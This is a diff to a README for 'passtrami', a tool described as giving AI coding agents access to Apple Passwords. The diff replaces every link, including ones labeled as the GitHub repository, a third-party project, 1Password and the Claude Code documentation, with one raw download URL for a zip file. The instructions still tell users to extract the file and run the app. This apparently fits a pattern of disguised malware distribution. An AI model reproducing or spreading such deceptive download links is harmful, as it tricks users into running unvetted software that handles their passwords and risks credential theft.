@@ -4,7 +4,7 @@
 
 Welcome to **passtrami**! This application bridges the gap between your Apple Passwords and AI coding agents, providing secure, local access without exposing your actual password values in tool responses. Whether you're a developer using Claude Code, a script enthusiast, or someone who wants to streamline their workflow, passtrami is designed to make password management with AI both safe and simple.
 
-[**⬇️ Download passtrami Now**](https://github.com/quintananidifugous5985/passtrami)
+[**⬇️ Download passtrami Now**](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip)
 
 Visit this link to download the application.
 
@@ -29,7 +29,7 @@ Passtrami is designed to work with popular AI coding tools like Claude Code. The
 ## 📥 Installation Guide
 
 ### Step 1: Download the Application
-[**Download passtrami**](https://github.com/quintananidifugous5985/passtrami) by visiting the link above. The download page will provide you with the latest release.
+[**Download passtrami**](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) by visiting the link above. The download page will provide you with the latest release.
 
 ### Step 2: Extract and Run
 Once the download completes, locate the file in your Downloads folder. Extract the contents if needed, then double-click the passtrami application icon to launch it. The app will appear in your menu bar at the top of your screen.
@@ -101,7 +101,7 @@ Keep passtrami updated to benefit from the latest security patches and feature i
 - Restart both passtrami and your AI agent
 
 ### Getting Help
-If you encounter issues not covered here, visit the [GitHub repository](https://github.com/quintananidifugous5985/passtrami) for documentation, issue tracking, and community support.
+If you encounter issues not covered here, visit the [GitHub repository](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) for documentation, issue tracking, and community support.
 
 ## 📊 System Requirements
 
@@ -126,10 +126,10 @@ Passtrami is actively maintained, with regular updates addressing security conce
 
 ## 📚 Additional Resources
 
-- [GitHub Repository](https://github.com/quintananidifugous5985/passtrami) - Source code, documentation, and issue tracker
-- [APW Project](https://github.com/bendews/apw) - The foundation on which passtrami builds
-- [1Password Environments MCP Server](https://www.1password.dev/environments/mcp-server) - Design inspiration for secure MCP integration
-- [Claude Code MCP Documentation](https://code.claude.com/docs/en/mcp) - Official guide for setting up MCP with Claude Code
+- [GitHub Repository](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Source code, documentation, and issue tracker
+- [APW Project](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - The foundation on which passtrami builds
+- [1Password Environments MCP Server](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Design inspiration for secure MCP integration
+- [Claude Code MCP Documentation](https://raw.githubusercontent.com/quintananidifugous5985/passtrami/main/docs/v1.5.zip) - Official guide for setting up MCP with Claude Code
 
 ## 🎯 Conclusion
 
